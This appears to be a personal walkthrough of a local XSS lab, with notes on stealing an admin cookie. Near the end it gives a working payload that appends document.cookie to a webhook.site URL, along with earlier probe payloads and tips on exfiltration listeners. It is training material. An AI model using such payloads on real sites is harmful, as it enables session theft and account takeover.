<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>XSS - Challenge Walkthrough</title>
</head><body>Lab3: http://localhost/labs/x0x03.php_admin.php<br/>
<br/>
Goal is to steal the admin cookie and not just pop it in an alert box but actually exfiltrate it.<br/>
<br/>
Can use Netcat to listen locally or can use webhook.site<br/>
https://webhook.site/#!/2ba09e5e-3bbb-4103-8924-2cee42b01330<br/>
<br/>
From container one we want to create a payload<br/>
From container two we want to trigger that payload<br/>
<br/>
In the real world when working as a pentest and exfilterating sensitive information, don't use public sites like webhook but can use EC2 instance or if vpn-ed into the network you can just use your local machine and listen.<br/>
<br/>
<br/>
But spinning up a webserver to capture a traffic isn't too difficult.<br/>
Can use Collaborator if have Burp Suite Pro.<br/>
<a href="https://portswigger.net/burp/documentation/collaborator">https://portswigger.net/burp/documentation/collaborator</a><br/>
<br/>
<br/>
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br/>
<br/>
<br/>
There is a DOM based CSS vulnerablity <br/>
let's check how to exploit it bruh<br/>
<br/>
&lt;script&gt; prompt(1) &lt;/script&gt;<br/>
&lt;img src=x onerror=&quot;document.cookie&quot;&gt;<br/>
<br/>
<br/>
<img height="377" src="image.png" width="650"/><br/>
<img height="298" src="image 2.png" width="600"/><br/>
<br/>
<br/>
<br/>
&lt;img src=x onerror=&quot;document.cookie&quot;&gt;<br/>
<img height="170" src="image 3.png" width="500"/><br/>
<br/>
<br/>
&lt;script&gt; prompt(document.cookie) &lt;/script&gt;<br/>
<img height="154" src="image 4.png" width="600"/><br/>
<img src="image 5.png"/><br/>
<br/>
<br/>
<br/>
<br/>
Got the admin ticket in webhook.site<br/>
&lt;script&gt;var i = new Image; i.src=&quot;https://webhook.site/e0edf9f6-fb9d-4bda-9d7c-22fbf2a697c3/?&quot;+document.cookie;&lt;/script&gt;<br/>
<br/>
<img height="398" src="image 6.png" width="800"/><br/>
<br/>
<br/>
<br/>
<br/>
</body></html>